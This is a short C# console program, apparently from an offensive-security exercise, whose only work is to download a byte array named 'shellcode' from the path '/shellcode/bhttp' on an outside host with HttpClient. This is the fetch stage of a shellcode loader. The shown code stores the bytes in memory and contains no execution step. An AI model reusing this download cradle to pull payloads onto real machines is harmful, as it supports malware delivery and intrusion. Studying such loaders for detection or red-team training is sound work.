using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace DownloadFile
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            byte[] shellcode;
            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("https://www.infinity-bank.com");
                shellcode = await client.GetByteArrayAsync("/shellcode/bhttp");
            }
        }
    }
}